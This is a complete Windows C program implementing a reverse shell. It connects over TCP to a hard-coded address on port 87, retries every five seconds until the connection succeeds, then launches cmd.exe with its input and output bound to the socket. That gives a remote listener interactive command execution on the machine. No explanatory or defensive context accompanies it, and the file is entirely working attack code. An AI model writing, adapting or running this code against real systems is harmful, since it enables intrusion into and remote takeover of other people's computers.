#include <winsock2.h>
#include <windows.h>
#pragma comment(lib, "Ws2_32.lib")

int main() {
    WSADATA w;
    WSAStartup(MAKEWORD(2,2), &w);
    
    // Use WSASocket instead of socket
    SOCKET s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    
    sockaddr_in a = {0};
    a.sin_family = AF_INET;
    a.sin_port = htons(87);
    a.sin_addr.s_addr = inet_addr("192.168.10.103");
    
    // Use WSAConnect instead of connect
    while (WSAConnect(s, (SOCKADDR*)&a, sizeof(a), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        Sleep(5000);
    }
    
    STARTUPINFO si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
    
    char cmd[] = "cmd.exe";
    CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    closesocket(s);
    WSACleanup();
    return 0;
}